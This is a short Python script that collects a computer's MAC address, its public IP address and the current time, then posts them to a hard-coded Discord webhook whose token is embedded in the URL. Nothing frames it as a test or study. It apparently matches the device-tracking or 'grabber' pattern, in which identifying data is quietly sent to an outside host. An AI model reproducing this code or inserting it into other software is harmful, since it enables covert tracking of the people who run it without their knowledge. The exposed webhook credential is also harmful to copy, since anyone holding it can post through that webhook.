import uuid
import requests
import time

def get_mac():
    mac_num = hex(uuid.getnode()).replace('0x', '').upper()
    mac = '-'.join(mac_num[i: i + 2] for i in range(0, 11, 2))
    return mac

def get_public_ipv4():
    public_ip = requests.get('https://api.ipify.org').text
    return public_ip

def get_current_time():
    return time.strftime("%d-%m-%Y %H:%M:%S", time.localtime())

mac = get_mac()
ipv4 = get_public_ipv4()
current_time = get_current_time()


webhook = "https://discord.com/api/webhooks/1175032834801549372/cRQIwLpmdhTUuIua6HrlIOCyCdl-b4S8n6mV4JoS2pdpQpPxOYrwV12-rAGKr-JwG3N6"


response = requests.post(webhook, json={"content": f"MAC: {mac}\nIPv4: {ipv4}\nTime: {current_time}\n"})


print(response.status_code)